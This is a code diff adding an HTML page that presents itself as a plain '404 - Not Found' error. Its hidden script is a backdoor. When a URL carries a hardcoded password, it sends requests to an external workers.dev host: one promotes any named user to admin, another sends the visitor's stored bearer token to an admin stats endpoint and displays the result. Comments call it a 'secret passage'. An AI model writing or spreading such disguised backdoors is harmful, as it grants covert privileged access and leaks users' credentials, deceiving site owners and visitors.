@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>404 - Not Found</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { 
+      font-family: 'Courier New', monospace; 
+      background: #0a0a0a; 
+      color: #333;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .container { text-align: center; }
+    h1 { font-size: 120px; color: #1a1a1a; margin-bottom: 20px; }
+    p { color: #666; font-size: 18px; }
+    .hidden-input {
+      position: absolute;
+      left: -9999px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>404</h1>
+    <p>Nothing here</p>
+  </div>
+  <!-- This page appears as 404 but processes secret commands -->
+  <script>
+    // Secret passage - appears as 404 but processes hidden commands
+    const params = new URLSearchParams(window.location.search);
+    const cmd = params.get('cmd');
+    const pass = params.get('pass');
+    
+    if (cmd && pass === 'XQXingPlushy201073_1102#!') {
+      const API = "https://xqpltool.guoharry267.workers.dev";
+      
+      if (cmd === 'promote') {
+        const user = params.get('user');
+        fetch(API + '/secret-admin', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ username: user, secret: pass })
+        }).then(r => r.json()).then(d => {
+          document.body.innerHTML = '<div class="container"><h1>✓</h1><p>' + JSON.stringify(d) + '</p></div>';
+        });
+      } else if (cmd === 'stats') {
+        const token = localStorage.getItem('token');
+        fetch(API + '/admin/stats', {
+          headers: { Authorization: 'Bearer ' + token }
+        }).then(r => r.json()).then(d => {
+          document.body.innerHTML = '<div class="container"><pre style="color:#0f0;font-size:14px;">' + JSON.stringify(d, null, 2) + '</pre></div>';
+        });
+      }
+    }
+  </script>
+</body>
+</html>
